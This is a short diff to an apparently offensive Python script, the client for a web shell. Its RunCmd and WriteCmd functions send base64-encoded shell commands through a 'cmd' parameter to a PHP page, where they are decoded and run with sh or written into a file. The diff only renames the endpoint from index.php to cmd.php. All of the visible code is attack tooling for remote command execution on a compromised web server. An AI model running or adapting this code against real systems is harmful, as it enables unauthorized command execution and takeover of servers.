@@ -27,7 +27,7 @@ def RunCmd(cmd):
 	payload = {
         	'cmd' : 'echo "%s" | base64 -d | sh' %(cmd)
 		}
-	result = (requests.get('http://127.0.0.1/index.php', params=payload, timeout=5).text).strip()
+	result = (requests.get('http://127.0.0.1/cmd.php', params=payload, timeout=5).text).strip()
 	return result
 
 def WriteCmd(cmd):
@@ -36,7 +36,7 @@ def WriteCmd(cmd):
 	payload = {
 		'cmd' : 'echo "%s" | base64 -d > %s' % (cmd, stdin)
 	}
-	result = (requests.get('http://127.0.0.1/index.php', params=payload, timeout=5).text).strip()
+	result = (requests.get('http://127.0.0.1/cmd.php', params=payload, timeout=5).text).strip()
 	return result
 
 def ReadCmd():
